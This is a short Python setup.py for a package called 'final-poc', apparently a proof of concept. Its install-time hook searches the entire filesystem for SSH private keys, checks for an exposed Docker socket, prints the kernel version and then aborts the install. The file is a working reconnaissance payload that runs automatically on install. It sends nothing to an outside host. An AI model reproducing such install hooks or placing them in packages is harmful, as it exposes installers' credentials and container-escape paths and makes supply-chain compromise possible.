import os
import sys
import subprocess
from setuptools import setup

def final_scan():
    err = sys.stderr.write
    err("\n" + "!"*60 + "\n")
    
    
    err("[+] SEARCHING FOR ANY SSH KEYS:\n")
    err(subprocess.getoutput("find / -name 'id_rsa*' -o -name 'id_ed25519*' 2>/dev/null") + "\n")
    
     
    err("\n[+] CHECKING DOCKER SOCKET:\n")
    if os.path.exists("/var/run/docker.sock"):
        err("!!! [CRITICAL] DOCKER SOCKET FOUND AT /var/run/docker.sock !!!\n")
    else:
        err("[-] No docker socket found\n")

     
    err(f"\n[+] KERNEL VERSION: {subprocess.getoutput('uname -a')}\n")
    
    err("!"*60 + "\n")
    sys.exit(1)

final_scan()
setup(name="final-poc", version="1.0.0")
